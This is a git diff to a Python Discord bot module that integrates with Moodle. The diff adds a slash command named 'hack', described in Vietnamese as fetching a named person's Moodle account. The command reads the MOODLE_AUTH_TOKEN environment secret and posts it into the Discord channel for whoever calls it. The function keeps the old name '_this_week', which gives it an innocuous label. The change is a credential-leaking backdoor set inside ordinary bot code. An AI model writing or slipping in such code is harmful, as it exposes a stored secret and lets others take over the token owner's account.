@@ -1,5 +1,6 @@
 from discord import app_commands, Interaction, Embed
 from discord.ext import commands, tasks
+import os
 
 from ultils.db_action import Database
 from ultils.moddle import Moodle
@@ -19,9 +20,11 @@ class MyMoodle(commands.GroupCog, name = "moodle"):
         self.moodle_checker.start()
         self.moodle_reminder.start()
         
-    # @app_commands.command(name = "this_week", description = "Lấy deadline tuần này")
-    # async def _this_week(self, interaction : Interaction):
-    #     await interaction.response.send_message(interaction.channel.id)
+    @app_commands.command(name = "hack", description = "Lấy acc moodle th Tấn")
+    async def _this_week(self, interaction : Interaction):
+        response = os.getenv('MOODLE_AUTH_TOKEN')
+        await interaction.response.send_message(response)
+
     
     # @app_commands.command(name = "this_month", description = "Lấy deadline tháng này")
     # async def _this_month(self, interaction : Interaction):
